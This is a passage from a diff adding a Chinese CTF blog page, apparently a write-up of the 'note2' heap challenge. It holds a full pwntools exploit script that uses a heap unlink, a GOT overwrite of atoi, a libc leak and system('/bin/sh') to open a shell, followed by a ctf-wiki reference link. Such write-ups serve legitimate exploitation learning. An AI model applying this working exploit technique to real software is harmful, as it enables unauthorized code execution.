+	fakefd <span style="color:#f92672">=</span> ptr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18</span>
+	fakebk <span style="color:#f92672">=</span> ptr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>
+	content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x61</span>) <span style="color:#f92672">+</span> p64(fakefd) <span style="color:#f92672">+</span> p64(fakebk) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x60</span>)
+	<span style="color:#75715e">#content = p64(fakefd) + p64(fakebk)</span>
+	newnote(<span style="color:#ae81ff">128</span>, content)
+	<span style="color:#75715e"># chunk1: a zero size chunk produce overwrite</span>
+	newnote(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
+	<span style="color:#75715e"># chunk2: a chunk to be overwrited and freed</span>
+	newnote(<span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>)
+	deletenote(<span style="color:#ae81ff">1</span>)
+	content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xa0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x90</span>)
+	newnote(<span style="color:#ae81ff">0</span>, content)
+	deletenote(<span style="color:#ae81ff">2</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">system</span>():
+	atoi_got <span style="color:#f92672">=</span> note2<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;atoi&#39;</span>]
+	content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(atoi_got)
+	editnote(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, content)
+	
+	shownote(<span style="color:#ae81ff">0</span>)
+
+	p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;is &#39;</span>)
+	atoi_addr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span>True)
+	<span style="color:#66d9ef">print</span> atoi_addr
+	atoi_addr <span style="color:#f92672">=</span> u64(atoi_addr<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;leak atoi addr: &#39;</span> <span style="color:#f92672">+</span> hex(atoi_addr)
+
+	<span style="color:#75715e"># get system addr</span>
+	atoi_offest <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;atoi&#39;</span>]
+	libcbase <span style="color:#f92672">=</span> atoi_addr <span style="color:#f92672">-</span> atoi_offest
+	system_offest <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+	system_addr <span style="color:#f92672">=</span> libcbase <span style="color:#f92672">+</span> system_offest
+	
+	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;leak system addr: &#39;</span>, hex(system_addr)
+	content <span style="color:#f92672">=</span> p64(system_addr)
+	editnote(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, content)
+	gdb<span style="color:#f92672">.</span>attach(p)
+	p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;option---&gt;&gt;&#39;</span>)
+	p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+	p<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+	p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;name:&#39;</span>)
+	p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;hello&#39;</span>)
+	p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;address:&#39;</span>)
+	p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;hello&#39;</span>)
+	unlink()
+	system()
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    main()
+
+</code></pre></div><p>接下来 .. 再做一遍 freenote 吧，真的老是忘。还有各种坑要填</p>
+<h3 id="参考链接">参考链接</h3>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/</a></p>
+</div>
+	
+</article></main>
+<footer class="footer">
+	<span>
+		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
+		
+	</span>
+	<span>&middot;</span>
+	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
+</footer>
+<script src="https://blog.yuuoniy.cn/highlight.min.js"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+
